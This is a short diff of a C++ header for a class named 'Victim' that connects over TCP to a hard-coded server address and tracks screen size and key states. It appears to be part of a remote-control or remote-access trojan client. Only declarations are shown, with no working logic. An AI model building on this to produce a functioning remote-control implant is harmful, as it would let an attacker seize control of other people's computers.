@@ -6,17 +6,19 @@
 #include <iostream>
 
 #define SERVER_IP "2.235.241.210"
-#define SERVER_PORT 2390
+#define SERVER_PORT 9002
 
 class Victim
 {
 public:
-	Victim(sf::UdpSocket* s);
+	Victim();
 	int controlVictim();
 
 private:
-	bool isRunning = true;
+	void connectServer();
+
+	bool isConnected = false, isRunning = true;
 	const Mlib::Vec2i screenSize = Mlib::displaySize();
-	sf::UdpSocket* socket;
+	sf::TcpSocket server;
 	bool keysStates[256];
 };
